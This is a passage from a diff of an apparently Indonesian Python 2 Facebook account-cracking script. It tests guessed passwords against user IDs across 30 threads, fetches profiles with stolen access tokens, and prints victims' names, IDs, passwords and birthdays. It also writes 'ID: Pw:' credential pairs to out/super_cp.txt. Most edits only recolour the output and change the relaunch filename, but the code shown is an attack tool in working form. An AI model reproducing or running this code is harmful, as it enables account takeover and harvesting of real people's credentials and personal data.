-																								print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-																								print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																								print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass10 + '\n'
-																								print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																								print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+																								print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass10 + '\n'
+																								print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																								cek = open("out/super_cp.txt", "a")
 																								cek.write("ID:" +user+ " Pw:" +pass10+"\n")
 																								cek.close()
@@ -632,19 +632,19 @@ def pilih_indo():
 																								if 'access_token' in w:
 																									x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
 																									z = json.loads(x.text)
-																									print '\x1c\033[1;94m[✔] \x1c\033[1;92mBerhasil'
-																									print '\x1c\033[1;94m[✴] \x1c\033[1;91mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
-																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																									print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
-																									print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																									print '\x1c\033[1;97m[\033[1;91m✔\033[1;97m] \x1c\033[1;33mBerhasil'
+																									print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass11 + '\n'
+																									print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																									oks.append(user+pass11)
 																								else:
 																									if 'www.facebook.com' in w['error_msg']:
-																										print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
-																										print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
-																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
-																										print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass11 + '\n'
-																										print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday']
+																										print '\x1c\033[1;97m[\033[1;91m✖\033[1;97m] \x1c\033[1;33mCheckpoint'
+																										print '\x1c\033[1;97m[\033[1;91m✴\033[1;97m] \x1c\033[1;33mName \x1c\033[1;91m    : \x1c\033[1;33m' + c['name']
+																										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mID \x1c\033[1;91m      : \x1c\033[1;33m' + user
+																										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mPassword \x1c\033[1;91m: \x1c\033[1;33m' + pass11 + '\n'
+																										print '\x1c\033[1;97m[\033[1;91m➹\033[1;97m] \x1c\033[1;33mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;33m' + c['birthday']
 																										cek = open("out/super_cp.txt", "a")
 																										cek.write("ID:" +user+ " Pw:" +pass11+"\n")
 																										cek.close()
@@ -654,13 +654,13 @@ def pilih_indo():
 			
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;34m████████████████████████████████████████████████"
+	print "\033[1;91m████████████████████████████████████████████████"
 	print '\033[1;97m[\033[1;93m✔\033[1;97m] \033[1;97mSelesai ....'
 	print"\033[1;97m[\033[1;93m✴\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print '\033[1;97m[\033[1;93m➹\033[1;97m] \033[1;97mCP file tersimpan : out/ind1.txt'
-	print "\033[1;34m████████████████████████████████████████████████"
+	print "\033[1;97m████████████████████████████████████████████████"
 	raw_input("\033[1;93m[\033[1;97m Kembali \033[1;93m]")
-	os.system("python2 SYBER-PUNK.py")
+	os.system("python2 newfile.py")
 	
 
 	
